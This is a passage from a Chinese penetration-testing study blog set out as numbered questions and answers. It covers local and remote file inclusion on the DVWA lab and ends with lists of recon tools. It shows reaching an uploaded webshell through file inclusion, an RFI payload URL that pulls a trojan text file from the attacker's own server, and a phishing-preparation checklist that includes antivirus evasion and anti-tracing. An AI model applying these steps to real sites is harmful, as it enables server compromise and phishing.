<p>我们先把 BP 给关掉，然后再用文件包含的方式对上传上去的文件进行访问，查看文件是否真的上传成功文件上传成功！ 接下来我们使用中国菜刀连接一下我们的木马文件。</p>
<p>打开我们的中国菜刀，在地址栏中填上我们木马文件上传到的路径， 这里采用文件包含的形式 <a href="http://www.any.com/index.php?page=dvwa/hackable/uploads/shell.php" target="_blank" rel="noopener">http://www.any.com/index.php?page=dvwa/hackable/uploads/shell.php</a> 密码为 f</p>
<p>脚本类型改为 PHP，点击添加之后，双击我们的链接进入 成功获取了 shell！！！</p>
<h3 id="问八十五：远程文件包含是什么？"><a href="#问八十五：远程文件包含是什么？" class="headerlink" title="问八十五：远程文件包含是什么？"></a>问八十五：远程文件包含是什么？</h3><p>远程文件包含本质上和 LFI (本地文件包含) 是同一个概 念，只是被包含的 “文件源” 不是从本次磁盘上获得，而 是从外部输入流得到。 如果 PHP 的配置选项  allow_url_include 为 ON 的话， 则 include/require 函数可以加载远程文件，这种漏洞被称为  “远程文件包含漏洞 (Remote File Inclusion RFI)”。</p>
<p>注意：如果是包含远程服务器上的 PHP 文件，那么得到的是被远程服务器解析过的 PHP，所以在写一句话木马的 时候就不要做成 .php 的文件 ，一般做成 .txt 的文件，再让它包含过来。</p>
<p>我们用 windows server 2003 服务器包含一个 Linux 上 的 phpinfo.php 文件，那么得到的就是 Linux 的 php 配置文件 ，而不是 Windows 上的 php 配置信息。</p>
<p>我们已知 192.168.173.128 这台服务器中存在着文件包含漏洞，我们想要通过远程包含自己的服务器上的木马文件，首先，我们在自己的服务器  192.168.173.129 上新建一 个文件 2.txt。我们通过远程包含文件包含到 192.168.173.128 这台目标 服务器上，  包含的方式与本地包含的方式类似： <a href="http://192.168.173.128/index.php?page=http://192" target="_blank" rel="noopener">http://192.168.173.128/index.php?page=http://192</a>. 168.173.129/2.txt。然后我们访问，若看到页面显示正常，说明文件包含成功。</p>
<h3 id="问八十六：邮件钓鱼的准备工作有哪些？"><a href="#问八十六：邮件钓鱼的准备工作有哪些？" class="headerlink" title="问八十六：邮件钓鱼的准备工作有哪些？"></a>问八十六：邮件钓鱼的准备工作有哪些？</h3><p>钓鱼邮件，即一种伪造邮件，是指利用伪装的电子邮件，来欺骗收件人点击恶意 URL，或诱导收件人下载带恶意程序的可执行文件。</p>
<p> 1、确定邮件钓鱼的形式：链接、文件</p>
<p> 2、收集目标相关的邮箱 </p>
<p>3、编写钓鱼邮件文案 </p>
<p>4、匿名邮箱 </p>
<p>5、木马免杀测试、钓鱼站点搭建 </p>
<p>6、反溯源</p>
<h1 id="六、一些常用工具汇总"><a href="#六、一些常用工具汇总" class="headerlink" title="六、一些常用工具汇总"></a>六、一些常用工具汇总</h1><ul>
<li>威胁情报平台 </li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://x.threatbook.cn/ 微步在线威胁情报社区</span><br><span class="line">https://ti.qianxin.com/ 奇安信威胁情报中心</span><br><span class="line">https://ti.360.cn/ 360威胁情报中心</span><br><span class="line">https://www.venuseye.com.cn/  </span><br><span class="line">VenusEye威胁情报中心</span><br></pre></td></tr></table></figure>
<ul>
<li>域名反查</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">站长之家IP查询网址：https://ip.tool.chinaz.com/ipbatch</span><br><span class="line">IP138查询网：https://www.ip138.com/</span><br><span class="line">高精度IP定位：https://www.opengps.cn/Data/IP/LocHighAcc.aspx</span><br><span class="line">IP信息查询：https://www.ipip.net/ip.html/</span><br><span class="line">IP地址查询在线工具：https://tool.lu/ip/</span><br><span class="line">多地Ping检测：http://ping.chinaz.com/</span><br><span class="line">Whois查询：https://whois.chinaz.com/</span><br></pre></td></tr></table></figure>
<ul>
<li>ip 定位网站 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.opengps.cn&#x2F;Data&#x2F;IP&#x2F;ipplus.aspx</span><br></pre></td></tr></table></figure>
<ul>
<li>在线子域名查询 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;phpinfo.me&#x2F;domain&#x2F;</span><br></pre></td></tr></table></figure>
<ul>
<li>网站指纹识别</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在线cms识别小插件：http:&#x2F;&#x2F;whatweb.bugscaner.com&#x2F;look&#x2F;</span><br><span class="line">wahtweb（需要安装）：https:&#x2F;&#x2F;github.com&#x2F;urbanadventurer&#x2F;WhatWeb</span><br><span class="line">云悉指纹：yunsee.cn-2.0</span><br><span class="line">参考链接：</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41755666&#x2F;article&#x2F;details&#x2F;123614559</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;zsw15841822890&#x2F;article&#x2F;details&#x2F;115774385</span><br></pre></td></tr></table></figure>
                
                <hr>
                <!-- Pager -->
                <ul class="pager">
                    
                    <li class="previous">
                        <a href="/2022/07/07/白帽子/" data-toggle="tooltip" data-placement="top" title="一些扫出来的老dong">&larr; Previous Post</a>
                    </li>
                    
                    
                    <li class="next">
                        <a href="/2022/06/15/内网学习/" data-toggle="tooltip" data-placement="top" title="内网学习">Next Post &rarr;</a>
                    </li>
                    
                </ul>

                <!-- tip start -->
                

                
                <div class="comment_notes">
                    <p>
                        本博客所有文章除特别声明外，均采用CC BY-SA 4.0 协议 ，转载请注明出处！
                    </p>
                </div>
                
                <!-- tip end -->

                <!-- Music start-->
                
                
<link rel="stylesheet" href="/css/music-player/fonts/iconfont.css">


<link rel="stylesheet" href="/css/music-player/css/reset.css">


<link rel="stylesheet" href="/css/music-player/css/player.css">


<div class="music-player">
    <audio class="music-player__audio" ></audio>
    <div class="music-player__main">
        <div class="music-player__blur"></div>
        <div class="music-player__disc">
            <div class="music-player__image">
                <img width="100%" src="" alt="">
            </div>
            <div class="music-player__pointer"><img width="100%" src="/img/cd_tou.png" alt=""></div>
        </div>
        <div class="music-player__controls">
            <div class="music__info">
                <h3 class="music__info--title">...</h3>
                <p class="music__info--singer">...</p>
            </div>
            <div class="player-control">
                <div class="player-control__content">
                    <div class="player-control__btns">
                        <div class="player-control__btn player-control__btn--prev"><i class="iconfont icon-prev"></i></div>
                        <div class="player-control__btn player-control__btn--play"><i class="iconfont icon-play"></i></div>
                        <div class="player-control__btn player-control__btn--next"><i class="iconfont icon-next"></i></div>
                        <div class="player-control__btn player-control__btn--mode"><i class="iconfont icon-loop"></i></div>
                    </div>
                    <div class="player-control__volume">
                        <div class="control__volume--icon player-control__btn"><i class="iconfont icon-volume"></i></div>
                        <div class="control__volume--progress player_progress"></div>
                    </div>
                </div>
                <div class="player-control__content">
                    <div class="player__song--progress player_progress"></div>
                    <div class="player__song--timeProgess nowTime">00:00</div>
                    <div class="player__song--timeProgess totalTime">00:00</div>
                </div>
            </div>
        </div>
    </div>
</div>


<script src="/js/music-player/utill.js"></script>


<script src="/js/music-player/jquery.min.js"></script>

<!-- netease; qqkg -->
<!--
<script src="/js/music-player/player.js?library=config.music.library.js"></script>
-->
<script src="../../../../js/music-player/player.js?library=netease&music=https://kg.qq.com/node/play?s=7deFpz7Z26Jmv7di&g_f=share_html"></script>
                
                <!-- Music end -->

                <!-- Sharing -->
                
                <div class="social-share"  data-wechat-qrcode-helper="" align="center"></div>
                <!--  css & js -->
                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
                <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
                
                <!-- Sharing -->

                <!-- gitment start -->
                
                <!-- gitment end -->

                <!-- 来必力City版安装代码 -->
                
                <!-- City版安装代码已完成 -->

                <!-- disqus comment start -->
                
                <!-- disqus comment end -->
            </div>
            
            <!-- Tabe of Content -->
            <!-- Table of Contents -->

                
            <!-- Sidebar Container -->
            <div class="
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                sidebar-container">

                <!-- Featured Tags -->
                
                <section>
                    <!-- no hr -->
                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
                    <div class="tags">
                       
                    </div>
                </section>
                

                <!-- Friends Blog -->
                
                <hr>
                <h5>FRIENDS</h5>
                <ul class="list-inline">

                    
                        <li><a href="http://na0h.cn/" target="_blank">间隔</a></li>
                    
                        <li><a href="https://hututu-w.github.io/" target="_blank">冰洁</a></li>
                    
                        <li><a href="https://gutoom.github.io/" target="_blank">Master_Zhang</a></li>
                    
                        <li><a href="https://saltyfishyjk.github.io/" target="_blank">saltyfishyjk</a></li>
                    
                        <li><a href="http://lyxx.link/" target="_blank">林会安全</a></li>
                    
                </ul>
                
            </div>
        </div>
    </div>
</article>




<!-- async load function -->
<script>
    function async(u, c) {
      var d = document, t = 'script',
          o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
      s.parentNode.insertBefore(o, s);
    }
</script>
<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
<script>
    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
        anchors.options = {
          visible: 'hover',
          placement: 'left',
          icon: 'ℬ'
        };
        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
    })
</script>


<style  type="text/css">
    /* place left on bigger screen */
    @media all and (min-width: 800px) {
        .anchorjs-link{
            position: absolute;
            left: -0.75em;
            font-size: 1.1em;
            margin-top : -0.1em;
        }
    }
</style>



    <!-- Footer -->
    <!-- Footer -->
<footer>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <ul class="list-inline text-center">

                
                    <li>
                        <a target="_blank"  href="https://github.com/wxx0105">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                

                

                

                

                

                

                

                </ul>
                <p class="copyright text-muted">
                    Copyright &copy; wx_x 2022 
                    <br>
                    Powered by 
                    <a href="https://github.com/dusign/hexo-theme-snail">
                        <i>hexo-theme-snail</i>
                    </a> | 
                    <iframe name="star" style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0"
                        width="100px" height="20px"
                        src="https://ghbtns.com/github-btn.html?user=dusign&repo=hexo-theme-snail&type=star&count=true">
                    </iframe>
                </p>
            </div>
        </div>
    </div>

</footer>

<!-- jQuery -->

<script src="/js/jquery.min.js"></script>


<!-- Bootstrap Core JavaScript -->

<script src="/js/bootstrap.min.js"></script>


<!-- Custom Theme JavaScript -->

<script src="/js/hux-blog.min.js"></script>


<!-- Search -->

<script src="/js/search.js"></script>


<!-- async load function -->
<script>
    function async(u, c) {
      var d = document, t = 'script',
          o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
      s.parentNode.insertBefore(o, s);
    }
</script>


<!-- jquery.tagcloud.js -->
<script>
    // only load tagcloud.js in tag.html
    if($('#tag_cloud').length !== 0){
        async("https://github.com/wxx0105/wxx0105.github.io/js/jquery.tagcloud.js",function(){
            $.fn.tagcloud.defaults = {
                //size: {start: 1, end: 1, unit: 'em'},
                color: {start: '#bbbbee', end: '#0085a1'},
            };
            $('#tag_cloud a').tagcloud();
        })
    }
</script>

<!--fastClick.js -->
<script>
    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
        var $nav = document.querySelector("nav");
        if($nav) FastClick.attach($nav);
    })
</script>


<!-- Google Analytics -->


<script>
    // dynamic User by Hux
    var _gaId = 'UA-XXXXXXXX-X';
    var _gaDomain = 'yoursite';

    // Originial
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', _gaId, _gaDomain);
    ga('send', 'pageview');
</script>




<!-- Baidu Tongji -->


<!-- Search -->

    <script type="text/javascript">      
        var search_path = "search.xml";
        if (search_path.length == 0) {
            search_path = "search.xml";
        }
    var path = "/" + search_path;
    searchFunc(path, 'local-search-input', 'local-search-result');
    </script>


<!-- busuanzi -->
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>






	<a id="rocket" href="#top" class=""></a>
	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>

    
        <!-- background effects line -->
        

        
            <script type="text/javascript" src="/js/mouse-click.js" content='[&quot;🌱&quot;,&quot;just do it wxx&quot;,&quot;🍀&quot;,&quot;🍂&quot;,&quot;🌈&quot;,&quot;🧿&quot;,&quot;🍁&quot;,&quot;🍇&quot;,&quot;🍍&quot;,&quot;🕌&quot;,&quot;⛩️&quot;]' color='[&quot;rgb(121,93,179)&quot; ,&quot;rgb(76,180,231)&quot; ,&quot;rgb(184,90,154)&quot;]'></script>
        

        <!-- background effects end -->
    

    <!--<script size="50" alpha='0.3' zIndex="-999" src="/js/ribbonStatic.js"></script>-->
    
        <script src="/js/ribbonDynamic.js"></script>
    
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</body>

</html>
